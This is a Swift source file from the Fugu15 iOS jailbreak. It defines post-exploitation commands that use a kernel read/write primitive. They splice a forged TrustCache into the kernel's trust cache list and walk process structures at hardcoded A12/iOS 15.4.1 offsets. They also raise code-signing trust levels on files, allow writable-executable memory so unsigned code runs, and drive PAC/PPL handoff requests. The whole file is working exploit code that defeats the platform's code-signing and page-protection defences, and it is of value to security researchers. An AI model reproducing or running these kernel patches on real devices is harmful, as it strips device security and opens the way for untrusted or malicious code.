//
//  iDownloadCmds.swift
//  Fugu15KernelExploit
//
//  Created by Linus Henze.
//  Copyright Â© 2022 Pinauten GmbH. All rights reserved.
//

import Foundation
import iDownload
import MachO
import CBindings

let iDownloadCmds = [
    "help": iDownload_help,
    "autorun": iDownload_autorun,
    "tcload": iDownload_tcload,
    "bootstrap": iDownload_bootstrap,
    "uninstall": iDownload_uninstall,
    "find_proc_pid": iDownload_findProcPid,
    "find_proc_name": iDownload_findProcName,
    "proc_list": iDownload_listProcs,
    "load_vnode": iDownload_loadVnode,
    "vnode_info": iDownload_vnodeInfo,
    "vnode_set_trust_level": iDownload_setTrustLevel,
    "proc_set_debugged": iDownload_setProcDebugged,
    "handoff": iDownload_handoff,
    "rebuild_tc": iDownload_rebuildTrustCache,
] as [String: iDownloadCmd]

func iDownload_help(_ hndlr: iDownloadHandler, _ cmd: String, _ args: [String]) throws {
    try hndlr.sendline("tcload <path to TrustCache>: Load a TrustCache")
    try hndlr.sendline("bootstrap:                   Extract bootstrap.tar to /private/preboot/jb")
    try hndlr.sendline("uninstall:                   Remove Procursus, Sileo and /var/jb symlink")
}

func iDownload_autorun(_ hndlr: iDownloadHandler, _ cmd: String, _ args: [String]) throws {
    /*if access("/private/preboot/jb/TrustCache", F_OK) == 0 {
        try iDownload_tcload(hndlr, "tcload", ["/private/preboot/jb/TrustCache"])
        _ = try? hndlr.exec("/sbin/mount", args: ["-u", "/private/preboot"])
        
        if access("/var/jb/Applications/Sileo.app", F_OK) == 0 {
            _ = try? hndlr.exec("/var/jb/usr/bin/uicache", args: ["-p", "/var/jb/Applications/Sileo.app"])
        }
    }*/
}

func iDownload_tcload(_ hndlr: iDownloadHandler, _ cmd: String, _ args: [String]) throws {
    if args.count != 1 {
        try hndlr.sendline("Usage: tcload <path to TrustCache>")
        return
    }
    
    guard let krw = hndlr.krw else {
        throw iDownloadError.custom("No KRW support!")
    }
    
    let tcPath = hndlr.resolve(path: args[0])
    guard let data = try? Data(contentsOf: URL(fileURLWithPath: tcPath)) else {
        throw iDownloadError.custom("Failed to read trust cache!")
    }
    
    // Make sure the trust cache is good
    guard data.count >= 0x18 else {
        throw iDownloadError.custom("Trust cache is too small!")
    }
    
    let vers = data.getGeneric(type: UInt32.self)
    guard vers == 1 else {
        throw iDownloadError.custom(String(format: "Trust cache has bad version (must be 1, is %u)!", vers))
    }
    
    let count = data.getGeneric(type: UInt32.self, offset: 0x14)
    guard data.count == 0x18 + (Int(count) * 22) else {
        throw iDownloadError.custom(String(format: "Trust cache has bad length (should be %p, is %p)!", 0x18 + (Int(count) * 22), data.count))
    }
    
    guard let pmap_image4_trust_caches = Fugu15.patchfinder?.pmap_image4_trust_caches else {
        throw iDownloadError.custom("Failed to patchfind pmap_image4_trust_caches!")
    }
    
    var mem: UInt64!
    do {
        mem = try krw.kalloc(size: UInt(data.count + 0x10))
    } catch let e {
        throw KRWError.customError(description: "Failed to allocate kernel memory for TrustCache: \(e)")
    }
    
    let next = KRWAddress(address: mem, options: [])
    let us   = KRWAddress(address: mem + 0x8, options: [])
    let tc   = KRWAddress(address: mem + 0x10, options: [])
    
    do {
        try krw.kwrite(address: us, data: Data(fromObject: mem + 0x10))
        try krw.kwrite(address: tc, data: data)
    } catch let e {
        throw KRWError.customError(description: "Failed to write to our TrustCache: \(e)")
    }
    
    let pitc = KRWAddress(address: pmap_image4_trust_caches + hndlr.slide, options: .PPL)
    
    // Read head
    guard let cur = krw.r64(pitc) else {
        throw KRWError.customError(description: "Failed to read TrustCache head!")
    }
    
    // Write into our list entry
    try krw.kwrite(address: next, data: Data(fromObject: cur))
    
    // Replace head
    try krw.kwrite(address: pitc, data: Data(fromObject: mem.unsafelyUnwrapped))
    
    try hndlr.sendline("Successfully loaded TrustCache!")
}

func iDownload_bootstrap(_ hndlr: iDownloadHandler, _ cmd: String, _ args: [String]) throws {
    let bootstrap_tar = Bundle.main.bundleURL.appendingPathComponent("bootstrap.tar").path
    let tar           = Bundle.main.bundleURL.appendingPathComponent("tar").path
    let trustCache    = Bundle.main.bundleURL.appendingPathComponent("TrustCache").path
    let sileo         = Bundle.main.bundleURL.appendingPathComponent("sileo.deb").path
    
    guard access(bootstrap_tar, F_OK) == 0 else {
        throw iDownloadError.custom("bootstrap.tar does not exist!")
    }
    
    guard access(tar, F_OK) == 0 else {
        throw iDownloadError.custom("tar does not exist!")
    }
    
    guard access(trustCache, F_OK) == 0 else {
        throw iDownloadError.custom("TrustCache for tar does not exist!")
    }
    
    try? FileManager.default.setAttributes([.posixPermissions: 0o755], ofItemAtPath: tar)
    
    try hndlr.sendline("Re-Mounting /private/preboot...")
    do {
        let exit = try hndlr.exec("/sbin/mount", args: ["-u", "/private/preboot"])
        if exit != 0 {
            throw iDownloadError.custom("mount failed: exit status: \(exit)")
        }
    } catch iDownloadError.execError(status: let status) {
        throw iDownloadError.custom("Failed to exec mount: posix_spawn error \(status) (\(String(cString: strerror(status)))")
    } catch iDownloadError.childDied(signal: let signal) {
        throw iDownloadError.custom("mount died: Signal: \(signal)")
    }
    
    try hndlr.sendline("Loading tar TrustCache...")
    try iDownload_tcload(hndlr, "tcload", [trustCache])
    
    try hndlr.sendline("Creating bootstrap dir")
    try? FileManager.default.removeItem(atPath: "/private/preboot/jb")
    try FileManager.default.createDirectory(atPath: "/private/preboot/jb", withIntermediateDirectories: false, attributes: nil)
    
    try hndlr.sendline("Extracting bootstrap.tar...")
    do {
        let exit = try hndlr.exec(tar, args: ["-xvf", bootstrap_tar], cwd: "/private/preboot/jb")
        if exit != 0 {
            throw iDownloadError.custom("tar failed: exit status: \(exit)")
        }
    } catch iDownloadError.execError(status: let status) {
        throw iDownloadError.custom("Failed to exec tar: posix_spawn error \(status) (\(String(cString: strerror(status)))")
    } catch iDownloadError.childDied(signal: let signal) {
        throw iDownloadError.custom("tar died: Signal: \(signal)")
    }
    
    if access("/private/preboot/jb/TrustCache", F_OK) == 0 {
        try hndlr.sendline("Loading bootstrap.tar TrustCache...")
        try iDownload_tcload(hndlr, "tcload", ["/private/preboot/jb/TrustCache"])
    }
    
    try hndlr.sendline("Creating /var/jb symlink...")
    try? FileManager.default.removeItem(atPath: "/var/jb")
    try? FileManager.default.createSymbolicLink(atPath: "/var/jb", withDestinationPath: "/private/preboot/jb")
    
    try hndlr.sendline("Running bootstrap.sh...")
    var status = try hndlr.exec("/var/jb/usr/bin/sh", args: ["/var/jb/prep_bootstrap.sh"])
    
    try hndlr.sendline("prep_bootstrap.sh: \(status)")
    
    if access(sileo, F_OK) == 0 {
        try hndlr.sendline("Installing Sileo...")
        status = try hndlr.exec("/var/jb/usr/bin/dpkg", args: ["-i", sileo])
        
        try hndlr.sendline("dpkg: \(status)")
        
        status = try hndlr.exec("/var/jb/usr/bin/uicache", args: ["-p", "/var/jb/Applications/Sileo.app"])
        
        try hndlr.sendline("uicache: \(status)")
    }
    
    try hndlr.sendline("Done")
}

func iDownload_uninstall(_ hndlr: iDownloadHandler, _ cmd: String, _ args: [String]) throws {
    if access("/var/jb/Applications/Sileo.app", F_OK) == 0 {
        try hndlr.sendline("Removing Sileo...")
        _ = try? hndlr.exec("/var/jb/usr/bin/uicache", args: ["-u", "/var/jb/Applications/Sileo.app"])
    }
    
    if access("/private/preboot/jb", F_OK) == 0 {
        try hndlr.sendline("Removing bootstrap...")
        try? FileManager.default.removeItem(atPath: "/private/preboot/jb")
    }
    
    try hndlr.sendline("Removing /var/jb symlink...")
    try? FileManager.default.removeItem(atPath: "/var/jb")
    
    try hndlr.sendline("Done")
}

// NOTE: All offsets here are only confirmed working on A12 15.4.1. You might need to supply your own.
// Some code can crash when something is unexpected because Swift has weird asserts and idk how to error out properly

func procGetPid(krw: KRWHandler, proc: UInt64) -> UInt32
{
    if proc == 0 { return 0 }
    let pidAddr = KRWAddress(address:(proc + 0x68), options: [])
    return krw.r32(pidAddr)!
}

func procGetName(krw: KRWHandler, proc: UInt64) -> String
{
    if proc == 0 { return "" }
    let namePtr = proc + 0x370
    var nameString = ""
    for k in 0...32
    {
        nameString += String(bytes: [krw.r8(KRWAddress(address:(namePtr+UInt64(k)), options: []))!], encoding: .utf8) ?? ""
    }
    return nameString
}

func procGetOfiles(krw: KRWHandler, proc: UInt64) -> UInt64
{
    if proc == 0 { return 0 }
    let fdAddr = KRWAddress(address:(proc + 0xD8 + 0x20), options: [])
    return krw.r64(fdAddr)! | 0xFFFFFF0000000000
}

func procGetFileProc(krw: KRWHandler, proc: UInt64, fd: Int32) -> UInt64
{
    if proc == 0 { return 0 }
    let ofiles = procGetOfiles(krw:krw, proc:proc)
    let fileprocAddr = KRWAddress(address:(ofiles + UInt64(fd * 8)), options: [])
    return krw.r64(fileprocAddr)! | 0xFFFFFF0000000000
}

func fileProcGetFileGlob(krw: KRWHandler, fileproc: UInt64) -> UInt64
{
    if fileproc == 0 { return 0 }
    let fileglobAddr = KRWAddress(address:(fileproc + 0x10), options: [])
    return krw.r64(fileglobAddr)! | 0xFFFFFF0000000000
}

func fileGlobGetVnode(krw: KRWHandler, fileglob: UInt64) -> UInt64
{
    if fileglob == 0 { return 0 }
    let vnodeAddr = KRWAddress(address:(fileglob + 0x38), options: [])
    return krw.r64(vnodeAddr)! | 0xFFFFFF0000000000
}

func procGetVnode(krw: KRWHandler, proc: UInt64, fd: Int32) -> UInt64
{
    if proc == 0 { return 0 }
    let fileProc = procGetFileProc(krw: krw, proc: proc, fd: fd)
    if fileProc == 0 { return 0 }
    let fileGlob = fileProcGetFileGlob(krw: krw, fileproc: fileProc)
    if fileGlob == 0 { return 0 }
    let vnode = fileGlobGetVnode(krw: krw, fileglob: fileGlob)
    if vnode == 0 { return 0 }
    return vnode
}

func vnodeGetUbcInfo(krw: KRWHandler, vnode: UInt64) -> UInt64
{
    if vnode == 0 { return 0 }
    let ubcInfoAddr = KRWAddress(address:(vnode + 0x78), options: [])
    return krw.r64(ubcInfoAddr)! | 0xFFFFFF0000000000
}

// TODO: make this enumerate
func ubcInfoGetCsBlobs(krw: KRWHandler, ubcInfo: UInt64) -> UInt64
{
    if ubcInfo == 0 { return 0 }
    let csBlobsAddr = KRWAddress(address:(ubcInfo + 0x50), options: [])
    return krw.r64(csBlobsAddr)! | 0xFFFFFF0000000000 // Not PACed on all fws
}

func csBlobGetPmapCsEntry(krw: KRWHandler, csBlob: UInt64) -> UInt64
{
    if csBlob == 0 { return 0 }
    let pmapCsEntryAddr = KRWAddress(address:(csBlob + 0xB0), options: [])
    return krw.r64(pmapCsEntryAddr)! | 0xFFFFFF0000000000 // Not PACed on all fws
}

func pmapCsEntryGetTrustLevel(krw: KRWHandler, pmapCsEntry: UInt64) -> UInt32
{
    if pmapCsEntry == 0 { return 0 }
    let trustLevelAddr = KRWAddress(address:(pmapCsEntry + 0x9C), options: [])
    return krw.r32(trustLevelAddr)!
}

func pmapCsEntrySetTrustLevel(krw: KRWHandler, pmapCsEntry: UInt64, trustLevel: UInt32)
{
    if pmapCsEntry == 0 { return }
    let trustLevelAddr = KRWAddress(address:(pmapCsEntry + 0x9C), options: .PPL)
    krw.w32(trustLevelAddr, value: trustLevel)
}

func procGetTask(krw: KRWHandler, proc: UInt64) -> UInt64
{
    if proc == 0 { return 0 }
    let taskAddr = KRWAddress(address:(proc + 0x10), options: [])
    return krw.r64(taskAddr)!
}

func taskGetVmMap(krw: KRWHandler, task: UInt64) -> UInt64
{
    if task == 0 { return 0 }
    let vmMapAddr = KRWAddress(address:(task + 0x28), options: [])
    return krw.r64(vmMapAddr)!
}

func vmMapGetPmap(krw: KRWHandler, vmMap: UInt64) -> UInt64
{
    if vmMap == 0 { return 0 }
    let pmapAddr = KRWAddress(address:(vmMap + 0x40), options: [])
    return krw.r64(pmapAddr)!
}

func pmapSetWxAllowed(krw: KRWHandler, pmap: UInt64, wx_allowed: UInt8)
{
    if pmap == 0 { return }
    let wxAllowedAddr = KRWAddress(address:(pmap + 0xC2), options: .PPL)
    krw.w8(wxAllowedAddr, value:wx_allowed)
}

func procSetWxAllowed(krw: KRWHandler, proc: UInt64, wx_allowed: UInt8)
{
    let task = procGetTask(krw: krw, proc: proc)
    let vmMap = taskGetVmMap(krw: krw, task: task)
    let pmap = vmMapGetPmap(krw: krw, vmMap:vmMap)
    pmapSetWxAllowed(krw: krw, pmap: pmap, wx_allowed: wx_allowed)
}

func vnodeGetTrustLevel(krw: KRWHandler, vnode: UInt64) -> UInt32
{
    let ubcInfo = vnodeGetUbcInfo(krw: krw, vnode: vnode)
    let csBlobs = ubcInfoGetCsBlobs(krw: krw, ubcInfo: ubcInfo)
    let pmapCsEntry = csBlobGetPmapCsEntry(krw: krw, csBlob:csBlobs)
    let trustLevel = pmapCsEntryGetTrustLevel(krw: krw, pmapCsEntry:pmapCsEntry)
    return trustLevel
}

func vnodeSetTrustLevel(krw: KRWHandler, vnode: UInt64, trustLevel: UInt32)
{
    let ubcInfo = vnodeGetUbcInfo(krw: krw, vnode: vnode)
    let csBlobs = ubcInfoGetCsBlobs(krw: krw, ubcInfo: ubcInfo)
    let pmapCsEntry = csBlobGetPmapCsEntry(krw: krw, csBlob:csBlobs)
    pmapCsEntrySetTrustLevel(krw: krw, pmapCsEntry: pmapCsEntry, trustLevel: trustLevel)
}

func enumProcs(krw: KRWHandler, enumerateBlock:(_ proc:UInt64, _ stop: inout Bool) -> Void)
{
    var proc = krw.r64(KRWAddress(address:(Fugu15.patchfinder?.allproc)! + Fugu15.kernelSlide, options: []))
    while (proc != 0) {

        var stop: Bool = false
        enumerateBlock(proc!, &stop)

        if(stop == true) {
            break
        }
        
        let next = KRWAddress(address:proc!, options: [])
        proc = krw.r64(next)
    }
}

func procForPid(krw: KRWHandler, pidToFind: UInt32) -> UInt64?
{
    var foundProc: UInt64? = 0
     enumProcs(krw:krw, enumerateBlock: { (proc, stop) in
        let pid = procGetPid(krw: krw, proc: proc)
        if pid == pidToFind {
            foundProc = proc
            stop = true
        }
    })
    return foundProc
}

func iDownload_findProcPid(_ hndlr: iDownloadHandler, _ cmd: String, _ args: [String]) throws {
    if args.count != 1 {
        try hndlr.sendline("Usage: find_proc_pid <pid>")
    }

    guard let krw = hndlr.krw else {
        throw iDownloadError.custom("No KRW support!")
    }

    let pidToFind = UInt32(args[0])
    let foundProc: UInt64? = procForPid(krw: krw, pidToFind: pidToFind!)

    if foundProc != nil {
        try hndlr.sendline(String(format:"Found proc: 0x%llx", foundProc!))
    }
    else {
        try hndlr.sendline("Unable to find proc with pid")
    }
}

// name offset: 0x370
func iDownload_findProcName(_ hndlr: iDownloadHandler, _ cmd: String, _ args: [String]) throws {
    if args.count != 1 {
        try hndlr.sendline("Usage: find_proc_name <name>")
    }

    guard let krw = hndlr.krw else {
        throw iDownloadError.custom("No KRW support!")
    }

    let nameToFind = args[0]
    var foundProc: UInt64? = 0

    enumProcs(krw:krw, enumerateBlock: { (proc, stop) in
        let name = procGetName(krw: krw, proc: proc)
        if name == nameToFind {
            foundProc = proc
            stop = true
        }
    })

    if foundProc != nil {
        try hndlr.sendline(String(format:"Found proc: 0x%llx (pid: 0x%d)", foundProc!, procGetPid(krw: krw, proc: foundProc!)))
    }
    else {
        try hndlr.sendline("Unable to find proc with name")
    }
}

func iDownload_listProcs(_ hndlr: iDownloadHandler, _ cmd: String, _ args: [String]) throws {
    guard let krw = hndlr.krw else {
        throw iDownloadError.custom("No KRW support!")
    }

    try hndlr.sendline("PID\t\tNAME\t\tKADDR")

    enumProcs(krw:krw, enumerateBlock: { (proc, stop) in
        let pid = procGetPid(krw: krw, proc: proc)
        let name = procGetName(krw: krw, proc: proc)
        do {
            try hndlr.sendline(String(format:"%d\t\t%@\t\t0x%llx", pid, name, proc))
        }
        catch {}
    })
}

func iDownload_loadVnode(_ hndlr: iDownloadHandler, _ cmd: String, _ args: [String]) throws {
    if args.count != 1 {
        try hndlr.sendline("Usage: load_vnode <path to file>")
        return
    }

    guard let krw = hndlr.krw else {
        throw iDownloadError.custom("No KRW support!")
    }

    guard let selfproc = procForPid(krw: krw, pidToFind:UInt32(getpid())) else {
        throw iDownloadError.custom("Couldn't find self proc")
    }

    let fd = open(args[0], O_RDONLY)
    if fd == -1 {
        do {
            try hndlr.sendline(String(format:"failed to open file"))
        }
        return
    }

    let vnodeAddr = procGetVnode(krw: krw, proc: selfproc, fd: fd)
    do {
        try hndlr.sendline(String(format:"Found vnode: 0x%llx for descriptor %lld", vnodeAddr, fd))
    }
    catch {}

    loadSignature(args[0])
}

func iDownload_vnodeInfo(_ hndlr: iDownloadHandler, _ cmd: String, _ args: [String]) throws {
    if args.count != 1 {
        try hndlr.sendline("Usage: vnode_info <vnode_ptr>")
        return
    }

    guard let krw = hndlr.krw else {
        throw iDownloadError.custom("No KRW support!")
    }

    guard let vnode = UInt64(args[0].dropFirst(2), radix:16) else {
        return
    }

    let tl = vnodeGetTrustLevel(krw: krw, vnode: vnode)

    do {
        try hndlr.sendline(String(format:"Trust level: %u", tl))
    }
    catch {}
}

func iDownload_setTrustLevel(_ hndlr: iDownloadHandler, _ cmd: String, _ args: [String]) throws {
    if args.count != 2 {
        try hndlr.sendline("Usage: vnode_set_trust_level <vnode_ptr> <trust_level>")
        return
    }

    guard let krw = hndlr.krw else {
        throw iDownloadError.custom("No KRW support!")
    }

    guard let vnode = UInt64(args[0].dropFirst(2), radix:16) else {
        return
    }

    guard let tlToSet = UInt32(args[1], radix:10) else {
        return
    }

    vnodeSetTrustLevel(krw: krw, vnode: vnode, trustLevel:tlToSet)

    do {
        try hndlr.sendline(String(format:"Set Trust Level %u to vnode 0x%llX", tlToSet, vnode))
    }
    catch {}
}

func iDownload_setProcDebugged(_ hndlr: iDownloadHandler, _ cmd: String, _ args: [String]) throws {
    if args.count != 2 {
        try hndlr.sendline("Usage: proc_set_debugged <proc_ptr> <debugged>")
        return
    }

    guard let krw = hndlr.krw else {
        throw iDownloadError.custom("No KRW support!")
    }

    guard let proc = UInt64(args[0].dropFirst(2), radix:16) else {
        return
    }

    guard let debugged = UInt8(args[1], radix:10) else {
        return
    }

    procSetWxAllowed(krw: krw, proc: proc, wx_allowed:debugged)
    do {
        try hndlr.sendline(String(format:"Marked proc 0x%llX as being debugged, library validation has been lowered and writing unsigned code should work.", proc))
    }
    catch {}
}

func iDownload_handoff(_ hndlr: iDownloadHandler, _ cmd: String, _ args: [String]) throws {
    guard let pid = UInt64(args[0], radix:10) else {
        return
    }

    let rsp = Fugu15.oobPCIRequest(id: 7, addrPid: pid)

    try hndlr.sendline(String(format:"handoff status: \(rsp.status)"))
    sendPPLHandoffRequest(rsp.result)

    let rsp1 = Fugu15.oobPCIRequest(id: 9, addrPid: pid)
    try hndlr.sendline(String(format:"handoff request status: \(rsp1.status), allocation: \(rsp1.result)"))

    let threadToSign = sendPACHandoffRequest(rsp1.result)
    try hndlr.sendline(String(format:"got thread to sign: \(threadToSign)"))

    let rsp2 = Fugu15.oobPCIRequest(id: 8, addrPid: threadToSign)
    try hndlr.sendline(String(format:"sign request status: \(rsp2.status)"))

    sendPACFinalizeHandoffRequest()
}

func iDownload_rebuildTrustCache(_ hndlr: iDownloadHandler, _ cmd: String, _ args: [String]) throws {
    sendRebuildTrustCacheRequest()
}